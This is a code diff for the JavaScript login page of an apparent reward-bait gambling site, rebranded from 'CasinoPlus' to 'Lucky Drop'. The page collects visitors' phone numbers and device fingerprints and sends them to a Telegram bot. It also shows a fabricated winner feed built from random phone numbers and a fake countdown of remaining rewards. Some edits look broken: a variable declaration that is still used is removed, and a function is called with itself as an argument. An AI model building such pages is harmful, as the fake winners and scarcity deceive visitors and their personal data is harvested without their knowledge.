@@ -1,5 +1,5 @@
 /**
- * CasinoPlus Index Page - Login & Verification
+ * Lucky Drop Index Page - Login & Verification
  * Saves device fingerprint to user_sessions
  * With Phone + Device Fingerprint Ban Check
  */
@@ -137,12 +137,15 @@ function showBlockedUI(reason = "banned") {
     }
 
     document.getElementById('modalBodyContent').innerHTML = `
-        <h2 style="color: #ff4d4d; margin-bottom: 15px;">${title}</h2>
-        <p style="font-size: 14px; color: #94a3b8; line-height: 1.6;">${blockMessage}</p>
-        <div style="font-size: 50px; margin: 20px 0;">🚫</div>
-        <button class="btn-main" style="margin-top: 20px; background: #334155; color: #fff; box-shadow: none;" onclick="location.reload()">OK</button>
+        <div class="bonus-preview">
+            <div class="preview-amount">🚫</div>
+            <div class="preview-label">ACCESS DENIED</div>
+        </div>
+        <h3 style="color: #FF4444; text-align: center; margin-bottom: 10px;">${title}</h3>
+        <p style="font-size: 13px; color: #94a3b8; text-align: center; margin-bottom: 20px;">${blockMessage}</p>
+        <button class="btn-claim" onclick="location.reload()" style="background: #334155; color: white;">OK</button>
     `;
-    mainCard.style.opacity = "0.2";
+    mainCard.style.opacity = "0.3";
     mainCard.style.pointerEvents = "none";
 }
 
@@ -242,7 +245,7 @@ window.processStep1 = async function() {
         if (banDetails.isBanned) {
             showBlockedUI("banned");
             btn.disabled = false;
-            btn.innerHTML = "Claim Now";
+            btn.innerHTML = "CLAIM REWARD";
             return;
         }
         
@@ -251,7 +254,7 @@ window.processStep1 = async function() {
         if (isClaimed) {
             showBlockedUI("claimed");
             btn.disabled = false;
-            btn.innerHTML = "Claim Now";
+            btn.innerHTML = "CLAIM REWARD";
             return;
         }
         
@@ -260,7 +263,7 @@ window.processStep1 = async function() {
         await saveDeviceInfo(phone, fingerprint, deviceDisplayId);
         await createUserSession(phone, fingerprint, deviceDisplayId);
         
-        // Send Telegram notification (no banned users)
+        // Send Telegram notification
         const message = `🎁 LUCKY DROP LOGIN:\n📱 ${phone}\n🖥️ FP: ${fingerprint}\n🔑 DEV#: ${deviceDisplayId}`;
         await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
             .catch(e => console.log('Telegram error:', e));
@@ -278,7 +281,7 @@ window.processStep1 = async function() {
         console.error("Process error:", error);
         alert("An error occurred. Please try again.");
         btn.disabled = false;
-        btn.innerHTML = "Claim Now";
+        btn.innerHTML = "CLAIM REWARD";
     }
 };
 
@@ -288,9 +291,8 @@ function startTicker() {
         const prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
         const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
         const randomSuffix = Math.floor(1000 + Math.random() * 9000);
-        const amounts = [150, 300, 450, 600, 750,900];
+        const amounts = [150, 300, 450, 600, 750];
         const amount = amounts[Math.floor(Math.random() * amounts.length)];
-        const winnerEntry = document.getElementById('winnerEntry');
         if (winnerEntry) {
             winnerEntry.innerHTML = `${randomPrefix}***${randomSuffix} earned <img src="images/gc_icon.png" class="feed-gc-icon" alt="₱"> ${amount}`;
         }
@@ -302,10 +304,79 @@ function startScarcityCounter() {
     setInterval(() => {
         if (count > 15) {
             count -= Math.floor(Math.random() * 2) + 1;
-            if (remNum) remNum.innerText = count + "/100";
+            if (remNum) remNum.innerText = count;
             if (pBar) pBar.style.width = count + "%";
         }
     }, 5000);
+}
+
+// ========== FLOATING PARTICLES EFFECT ==========
+function initParticles() {
+    const canvas = document.getElementById('particleCanvas');
+    if (!canvas) return;
+    
+    let width = window.innerWidth;
+    let height = window.innerHeight;
+    let particles = [];
+    let ctx = canvas.getContext('2d');
+    
+    function resizeCanvas() {
+        width = window.innerWidth;
+        height = window.innerHeight;
+        canvas.width = width;
+        canvas.height = height;
+    }
+    
+    function createParticles() {
+        const particleCount = Math.min(40, Math.floor(width * height / 20000));
+        for (let i = 0; i < particleCount; i++) {
+            particles.push({
+                x: Math.random() * width,
+                y: Math.random() * height,
+                size: Math.random() * 2 + 1,
+                alpha: Math.random() * 0.25 + 0.05,
+                vx: (Math.random() - 0.5) * 0.3,
+                vy: (Math.random() - 0.5) * 0.2
+            });
+        }
+    }
+    
+    function animateParticles() {
+        if (!ctx) return;
+        ctx.clearRect(0, 0, width, height);
+        
+        for (let p of particles) {
+            p.x += p.vx;
+            p.y += p.vy;
+            
+            if (p.x < 0) p.x = width;
+            if (p.x > width) p.x = 0;
+            if (p.y < 0) p.y = height;
+            if (p.y > height) p.y = 0;
+            
+            ctx.beginPath();
+            ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
+            ctx.fillStyle = `rgba(255, 215, 0, ${p.alpha})`;
+            ctx.fill();
+        }
+        
+        requestAnimationFrame(animateParticles);
+    }
+    
+    window.addEventListener('resize', () => {
+        resizeCanvas();
+        particles = [];
+        createParticles();
+    });
+    
+    resizeCanvas();
+    createParticles();
+    animateParticles();
+}
+
+// ========== MODAL FUNCTIONS ==========
+function closeModal() {
+    if (modalOverlay) modalOverlay.style.display = 'none';
 }
 
 // ========== CHECK HASH ON LOAD ==========
@@ -316,8 +387,16 @@ window.onload = () => {
 };
 
 // ========== INITIALIZE ==========
-startTicker();
+startTicker(startTicker);
 startScarcityCounter();
+initParticles();
+
+// Modal close on outside click
+if (modalOverlay) {
+    modalOverlay.addEventListener('click', function(e) {
+        if (e.target === modalOverlay) closeModal();
+    });
+}
 
 // Enter key support
 userPhoneInput?.addEventListener('keypress', (e) => {
